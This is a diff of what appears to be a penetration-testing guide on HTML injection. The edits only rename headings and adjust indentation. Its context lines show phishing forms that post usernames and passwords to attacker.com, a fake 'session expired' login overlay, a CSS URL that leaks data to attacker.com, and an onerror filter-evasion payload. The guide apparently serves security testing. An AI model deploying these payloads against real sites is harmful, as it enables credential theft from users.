@@ -39,7 +39,7 @@ Identify and exploit HTML injection vulnerabilities that allow attackers to inje
 3. **Impact Assessment** - Potential phishing and defacement risks
 4. **Remediation Guidance** - Input validation recommendations
 
-## Core Workflow
+## Workflow
 
 ### Phase 1: Understanding HTML Injection
 
@@ -48,7 +48,7 @@ HTML injection occurs when user input is reflected in web pages without proper s
 ```html
 <!-- Vulnerable code example -->
 <div>
-    Welcome, <?php echo $_GET['name']; ?>
+Welcome, <?php echo $_GET['name']; ?>
 </div>
 
 <!-- Attack input -->
@@ -165,8 +165,8 @@ Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;backgroun
 <!-- Comment injection -->
 Great article!
 <form action="http://attacker.com/steal" method="POST">
-    <input name="username" placeholder="Session expired. Enter username:">
-    <input name="password" type="password" placeholder="Password:">
+<input name="username" placeholder="Session expired. Enter username:">
+<input name="password" type="password" placeholder="Password:">
     <input type="submit" value="Login">
 </form>
 ```
@@ -223,10 +223,10 @@ Create convincing phishing forms:
     <h2>Session Expired</h2>
     <p>Your session has expired. Please log in again.</p>
     <form action="http://attacker.com/capture" method="POST">
-        <label>Username:</label><br>
-        <input type="text" name="username" style="width:200px;"><br><br>
+<label>Username:</label><br>
+<input type="text" name="username" style="width:200px;"><br><br>
         <label>Password:</label><br>
-        <input type="password" name="password" style="width:200px;"><br><br>
+<input type="password" name="password" style="width:200px;"><br><br>
         <input type="submit" value="Login">
     </form>
 </div>
@@ -236,8 +236,8 @@ Create convincing phishing forms:
     input { background: url('http://attacker.com/log?data=') }
 </style>
 <form action="http://attacker.com/steal" method="POST">
-    <input name="user" placeholder="Verify your username">
-    <input name="pass" type="password" placeholder="Verify your password">
+<input name="user" placeholder="Verify your username">
+<input name="pass" type="password" placeholder="Verify your password">
     <button>Verify</button>
 </form>
 ```
@@ -275,7 +275,7 @@ Website appearance manipulation:
 </marquee>
 ```
 
-### Phase 7: Advanced Injection Techniques
+### Phase 7: Injection Techniques
 
 #### CSS Injection
 
@@ -353,7 +353,7 @@ Evade basic filters:
 <img src=x onerror=alert(1)>
 ```
 
-### Phase 9: Automated Testing
+### Phase 9: Testing
 
 #### Using Burp Suite
 
